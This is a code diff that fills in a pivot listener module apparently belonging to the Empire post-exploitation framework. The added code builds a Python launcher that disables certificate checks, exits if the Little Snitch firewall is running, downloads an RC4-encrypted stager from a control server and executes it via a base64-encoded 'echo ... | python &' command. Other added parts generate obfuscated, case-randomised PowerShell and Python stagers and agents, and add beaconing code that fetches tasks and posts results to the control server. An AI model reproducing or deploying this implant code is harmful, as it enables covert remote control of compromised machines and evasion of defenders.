@@ -32,8 +32,8 @@ class Listener:
             # format:
             #   value_name : {description, required, default_value}
 
-            'Agent' : {
-                'Description'   :   'Agent name that will serve as the internal pivot',
+            'Name' : {
+                'Description'   :   'Listener name. This needs to be the name of the agent that will serve as the internal pivot',
                 'Required'      :   True,
                 'Value'         :   ""
             },
@@ -42,7 +42,7 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'Port' : {
+            'ListenPort' : {
                 'Description'   :   'Port for the agent to listen on.',
                 'Required'      :   True,
                 'Value'         :   80
@@ -241,7 +241,101 @@ class Listener:
 
             if language.startswith('py'):
                 # Python
-                return ''
+
+                launcherBase = 'import sys;'
+                if "https" in host:
+                    # monkey patch ssl woohooo
+                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
+
+                try:
+                    if safeChecks.lower() == 'true':
+                        launcherBase += "import re, subprocess;"
+                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
+                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
+                        launcherBase += "out = ps.stdout.read()\n"
+                        launcherBase += "ps.stdout.close()\n"
+                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
+                        launcherBase += "   sys.exit()\n"
+                except Exception as e:
+                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
+                    print helpers.color(p, color='red')
+
+                if userAgent.lower() == 'default':
+                    profile = listenerOptions['DefaultProfile']['Value']
+                    userAgent = profile.split('|')[1]
+
+                launcherBase += "import urllib2;\n"
+                launcherBase += "UA='%s';" % (userAgent)
+                launcherBase += "server='%s';t='%s';" % (host, stage0)
+
+                # prebuild the request routing packet for the launcher
+                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
+                b64RoutingPacket = base64.b64encode(routingPacket)
+
+                launcherBase += "req=urllib2.Request(server+t);\n"
+                # add the RC4 packet to a cookie
+                launcherBase += "req.add_header('User-Agent',UA);\n"
+                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (b64RoutingPacket)
+
+                # Add custom headers if any
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
+                        launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
+
+
+                if proxy.lower() != "none":
+                    if proxy.lower() == "default":
+                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                    else:
+                        proto = proxy.Split(':')[0]
+                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"
+
+                    if proxyCreds != "none":
+                        if proxyCreds == "default":
+                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        else:
+                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
+                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                    else:
+                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                else:
+                    launcherBase += "o = urllib2.build_opener();\n"
+
+                #install proxy and creds globally, so they can be used with urlopen.
+                launcherBase += "urllib2.install_opener(o);\n"
+
+                # download the stager and extract the IV
+
+                launcherBase += "a=urllib2.urlopen(req).read();\n"
+                launcherBase += "IV=a[0:4];"
+                launcherBase += "data=a[4:];"
+                launcherBase += "key=IV+'%s';" % (stagingKey)
+
+                # RC4 decryption
+                launcherBase += "S,j,out=range(256),0,[]\n"
+                launcherBase += "for i in range(256):\n"
+                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
+                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
+                launcherBase += "i=j=0\n"
+                launcherBase += "for char in data:\n"
+                launcherBase += "    i=(i+1)%256\n"
+                launcherBase += "    j=(j+S[i])%256\n"
+                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
+                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
+                launcherBase += "exec(''.join(out))"
+
+                if encode:
+                    launchEncoded = base64.b64encode(launcherBase)
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    return launcher
+                else:
+                    return launcherBase
 
             else:
                 print helpers.color("[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module.")
@@ -255,8 +349,114 @@ class Listener:
         If you want to support staging for the listener module, generate_stager must be
         implemented to return the stage1 key-negotiation stager code.
         """
-        print helpers.color("[!] generate_stager() not implemented for listeners/template")
-        return ''
+        if not language:
+            print helpers.color('[!] listeners/http generate_stager(): no language specified!')
+            return None
+
+
+        profile = listenerOptions['DefaultProfile']['Value']
+        uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
+        launcher = listenerOptions['Launcher']['Value']
+        stagingKey = listenerOptions['StagingKey']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
+        killDate = listenerOptions['KillDate']['Value']
+        host = listenerOptions['Host']['Value']
+        customHeaders = profile.split('|')[2:]
+
+        # select some random URIs for staging from the main profile
+        stage1 = random.choice(uris)
+        stage2 = random.choice(uris)
+
+        if language.lower() == 'powershell':
+
+            # read in the stager base
+            f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
+            stager = f.read()
+            f.close()
+
+            # make sure the server ends with "/"
+            if not host.endswith("/"):
+                host += "/"
+
+            #Patch in custom Headers
+            if customHeaders != []:
+                headers = ','.join(customHeaders)
+                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
+
+            #patch in working hours, if any
+            if workingHours != "":
+                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
+
+            #Patch in the killdate, if any
+            if killDate != "":
+                stager = stager.replace('REPLACE_KILLDATE', killDate)
+
+            # patch the server and key information
+            stager = stager.replace('REPLACE_SERVER', host)
+            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
+            stager = stager.replace('index.jsp', stage1)
+            stager = stager.replace('index.php', stage2)
+
+            randomizedStager = ''
+
+            for line in stager.split("\n"):
+                line = line.strip()
+                # skip commented line
+                if not line.startswith("#"):
+                    # randomize capitalization of lines without quoted strings
+                    if "\"" not in line:
+                        randomizedStager += helpers.randomize_capitalization(line)
+                    else:
+                        randomizedStager += line
+
+            if obfuscate:
+                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
+            # base64 encode the stager and return it
+            if encode:
+                return helpers.enc_powershell(randomizedStager)
+            elif encrypt:
+                RC4IV = os.urandom(4)
+                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
+            else:
+                # otherwise just return the case-randomized stager
+                return randomizedStager
+
+        elif language.lower() == 'python':
+            # read in the stager base
+            f = open("%s/data/agent/stagers/http.py" % (self.mainMenu.installPath))
+            stager = f.read()
+            f.close()
+
+            stager = helpers.strip_python_comments(stager)
+
+            if host.endswith("/"):
+                host = host[0:-1]
+
+            if workingHours != "":
+                stager = stager.replace('SET_WORKINGHOURS', workingHours)
+
+            if killDate != "":
+                stager = stager.replace('SET_KILLDATE', killDate)
+
+            # # patch the server and key information
+            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
+            stager = stager.replace("REPLACE_PROFILE", profile)
+            stager = stager.replace("index.jsp", stage1)
+            stager = stager.replace("index.php", stage2)
+
+            # # base64 encode the stager and return it
+            if encode:
+                return base64.b64encode(stager)
+            if encrypt:
+                # return an encrypted version of the stager ("normal" staging)
+                RC4IV = os.urandom(4)
+                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
+            else:
+                # otherwise return the standard stager
+                return stager
+
+        else:
+            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
 
     def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
@@ -264,8 +464,74 @@ class Listener:
         If you want to support staging for the listener module, generate_agent must be
         implemented to return the actual staged agent code.
         """
-        print helpers.color("[!] generate_agent() not implemented for listeners/template")
-        return ''
+        if not language:
+            print helpers.color('[!] listeners/http generate_agent(): no language specified!')
+            return None
+
+        language = language.lower()
+        delay = listenerOptions['DefaultDelay']['Value']
+        jitter = listenerOptions['DefaultJitter']['Value']
+        profile = listenerOptions['DefaultProfile']['Value']
+        lostLimit = listenerOptions['DefaultLostLimit']['Value']
+        killDate = listenerOptions['KillDate']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
+        b64DefaultResponse = base64.b64encode(self.default_response())
+
+        if language == 'powershell':
+
+            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
+            code = f.read()
+            f.close()
+
+            # patch in the comms methods
+            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
+            code = code.replace('REPLACE_COMMS', commsCode)
+
+            # strip out comments and blank lines
+            code = helpers.strip_powershell_comments(code)
+
+            # patch in the delay, jitter, lost limit, and comms profile
+            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
+            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
+            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
+            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
+
+            # patch in the killDate and workingHours if they're specified
+            if killDate != "":
+                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
+            if obfuscate:
+                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
+            return code
+
+        elif language == 'python':
+            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
+            code = f.read()
+            f.close()
+
+            # patch in the comms methods
+            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
+            code = code.replace('REPLACE_COMMS', commsCode)
+
+            # strip out comments and blank lines
+            code = helpers.strip_python_comments(code)
+
+            # patch in the delay, jitter, lost limit, and comms profile
+            code = code.replace('delay = 60', 'delay = %s' % (delay))
+            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
+            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
+            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
+            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
+
+            # patch in the killDate and workingHours if they're specified
+            if killDate != "":
+                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
+            if workingHours != "":
+                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
+
+            return code
+        else:
+            print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
 
     def generate_comms(self, listenerOptions, language=None):
@@ -278,16 +544,52 @@ class Listener:
 
         if language:
             if language.lower() == 'powershell':
-                
+
                 updateServers = """
                     $Script:ControlServers = @("%s");
                     $Script:ServerIndex = 0;
                 """ % (listenerOptions['Host']['Value'])
-                
+
+                if listenerOptions['Host']['Value'].startswith('https'):
+                    updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+
                 getTask = """
                     function script:Get-Task {
 
+                        try {
+                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
 
+                                # meta 'TASKING_REQUEST' : 4
+                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
+                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
+
+                                # build the web request object
+                                $wc = New-Object System.Net.WebClient
+
+                                # set the proxy settings for the WC to be the default system settings
+                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                if($Script:Proxy) {
+                                    $wc.Proxy = $Script:Proxy;
+                                }
+
+                                $wc.Headers.Add("User-Agent",$script:UserAgent)
+                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
+                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")
+
+                                # choose a random valid URI for checkin
+                                $taskURI = $script:TaskURIs | Get-Random
+                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
+                                $result
+                            }
+                        }
+                        catch [Net.WebException] {
+                            $script:MissedCheckins += 1
+                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                # restart key negotiation
+                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
+                            }
+                        }
                     }
                 """
 
@@ -296,20 +598,106 @@ class Listener:
                         param($Packets)
 
                         if($Packets) {
+                            # build and encrypt the response packet
+                            $EncBytes = Encrypt-Bytes $Packets
 
+                            # build the top level RC4 "routing packet"
+                            # meta 'RESULT_POST' : 5
+                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
+
+                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
+                                # build the web request object
+                                $wc = New-Object System.Net.WebClient
+                                # set the proxy settings for the WC to be the default system settings
+                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                if($Script:Proxy) {
+                                    $wc.Proxy = $Script:Proxy;
+                                }
+
+                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
+                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+
+                                try {
+                                    # get a random posting URI
+                                    $taskURI = $Script:TaskURIs | Get-Random
+                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                }
+                                catch [System.Net.WebException]{
+                                    # exception posting data...
+                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                                        # restart key negotiation
+                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
+                                    }
+                                }
+                            }
                         }
                     }
                 """
 
-                return updateServers + getTask + sendMessage + "\n'New agent comms registered!'"
+                return updateServers + getTask + sendMessage
 
             elif language.lower() == 'python':
-                # send_message()
-                pass
+
+                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
+
+                if listenerOptions['Host']['Value'].startswith('https'):
+                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
+
+                sendMessage = """
+def send_message(packets=None):
+    # Requests a tasking or posts data to a randomized tasking URI.
+    # If packets == None, the agent GETs a tasking from the control server.
+    # If packets != None, the agent encrypts the passed packets and
+    #    POSTs the data to the control server.
+
+    global missedCheckins
+    global server
+    global headers
+    global taskURIs
+
+    data = None
+    if packets:
+        data = ''.join(packets)
+        # aes_encrypt_then_hmac is in stager.py
+        encData = aes_encrypt_then_hmac(key, data)
+        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
+    else:
+        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
+        #   meta TASKING_REQUEST = 4
+        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
+        b64routingPacket = base64.b64encode(routingPacket)
+        headers['Cookie'] = "session=%s" % (b64routingPacket)
+
+    taskURI = random.sample(taskURIs, 1)[0]
+    requestUri = server + taskURI
+
+    try:
+        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
+        return ('200', data)
+
+    except urllib2.HTTPError as HTTPError:
+        # if the server is reached, but returns an erro (like 404)
+        missedCheckins = missedCheckins + 1
+        #if signaled for restaging, exit.
+        if HTTPError.code == 401:
+            sys.exit(0)
+
+        return (HTTPError.code, '')
+
+    except urllib2.URLError as URLerror:
+        # if the server cannot be reached
+        missedCheckins = missedCheckins + 1
+        return (URLerror.reason, '')
+
+    return ('', '')
+"""
+                return updateServers + sendMessage
+
             else:
-                print helpers.color("[!] listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module.")
+                print helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
         else:
-            print helpers.color('[!] listeners/template generate_comms(): no language specified!')
+            print helpers.color('[!] listeners/http generate_comms(): no language specified!')
 
 
     def start(self, name=''):
@@ -318,18 +706,19 @@ class Listener:
         here and the actual server code in another function to facilitate threading
         (i.e. start_server() in the http listener).
         """
+        
         tempOptions = copy.deepcopy(self.options)
         listenerName = self.options['Listener']['Value']
         # validate that the Listener does exist
         if self.mainMenu.listeners.is_listener_valid(listenerName):
             # check if a listener for the agent already exists
             
-            if self.mainMenu.listeners.is_listener_valid(tempOptions['Agent']['Value']):
-                print helpers.color("[!] Pivot listener already exists on agent %s" % (tempOptions['Agent']['Value']))
+            if self.mainMenu.listeners.is_listener_valid(tempOptions['Name']['Value']):
+                print helpers.color("[!] Pivot listener already exists on agent %s" % (tempOptions['Name']['Value']))
                 return False
 
             listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
-            sessionID = self.mainMenu.agents.get_agent_id_db(tempOptions['Agent']['Value'])
+            sessionID = self.mainMenu.agents.get_agent_id_db(tempOptions['Name']['Value'])
             isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)
 
             if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:
@@ -407,7 +796,7 @@ class Listener:
         Invoke-Redirector"""
 
                     script += " -ConnectHost %s" % (listenerOptions['Host']['Value'])
-                    script += " -ListenPort %s" % (tempOptions['Port']['Value'])
+                    script += " -ListenPort %s" % (tempOptions['ListenPort']['Value'])
 
                     # clone the existing listener options
                     self.options = copy.deepcopy(listenerOptions)
@@ -415,14 +804,14 @@ class Listener:
                     for option, values in self.options.iteritems():
 
                         if option.lower() == 'name':
-                            self.options[option] = sessionID
+                            self.options[option]['Value'] = sessionID
 
                         elif option.lower() == 'host':
                             if self.options[option]['Value'].startswith('https://'):
-                                host = "https://%s:%s" % (tempOptions['internalIP']['Value'], tempOptions['Port']['Value'])
+                                host = "https://%s:%s" % (tempOptions['internalIP']['Value'], tempOptions['ListenPort']['Value'])
                                 self.options[option]['Value'] = host
                             else:
-                                host = "http://%s:%s" % (tempOptions['internalIP']['Value'], tempOptions['Port']['Value'])
+                                host = "http://%s:%s" % (tempOptions['internalIP']['Value'], tempOptions['ListenPort']['Value'])
                                 self.options[option]['Value'] = host
 
                     
@@ -430,14 +819,14 @@ class Listener:
                     if "Host" not in self.options.keys():
                         self.options['Host']['Value'] = host
 
-                    self.mainMenu.agents.add_agent_task_db(tempOptions['Agent']['Value'], "TASK_SHELL", script)
+                    self.mainMenu.agents.add_agent_task_db(tempOptions['Name']['Value'], "TASK_SHELL", script)
                     msg = "Tasked agent to install Pivot listener "
-                    self.mainMenu.agents.save_agent_log(tempOptions['Agent']['Value'], msg)
+                    self.mainMenu.agents.save_agent_log(tempOptions['Name']['Value'], msg)
 
 
                     return True
 
-                elif self.mainMenu.agents.get_language_db(self.options['Agent']['Value']).startswith('py'):
+                elif self.mainMenu.agents.get_language_db(self.options['Name']['Value']).startswith('py'):
 
                     # not implemented
                     script = """
@@ -452,10 +841,6 @@ class Listener:
             else:
                 print helpers.color("[!] Agent is not present in the cache")
                 return False
-
-        
-
-        return True
 
 
     def shutdown(self, name=''):
@@ -556,17 +941,5 @@ class Listener:
                     
             else:
                 print helpers.color("[!] Agent is not present in the cache or not elevated")
-                
-
-
-
-
-
-        # if name and name != '':
-        #     print helpers.color("[!] Killing listener '%s'" % (name))
-        #     self.threads[name].kill()
-        # else:
-        #     print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
-        #     self.threads[self.options['Name']['Value']].kill()
 
         pass
